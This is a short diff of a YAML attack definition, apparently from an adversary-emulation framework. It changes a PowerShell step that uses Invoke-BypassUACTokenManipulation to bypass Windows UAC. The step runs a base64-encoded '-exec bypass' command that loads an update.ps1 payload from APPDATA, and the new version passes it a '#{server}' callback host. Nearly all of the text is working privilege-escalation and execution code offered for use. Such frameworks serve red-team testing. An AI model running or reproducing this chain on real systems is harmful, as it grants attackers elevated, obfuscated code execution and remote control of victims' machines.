@@ -12,7 +12,7 @@
       psh,pwsh:
         command: |
           Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
-          Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7AHUAcABkAGEAdABlAA==" -Verbose
-        payload: Invoke-BypassUACTokenManipulation.ps1
-
-# Encoded command: Import-Module $env:APPDATA\update.ps1;update
+          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
+        payload: update.ps1,Invoke-BypassUACTokenManipulation.ps1
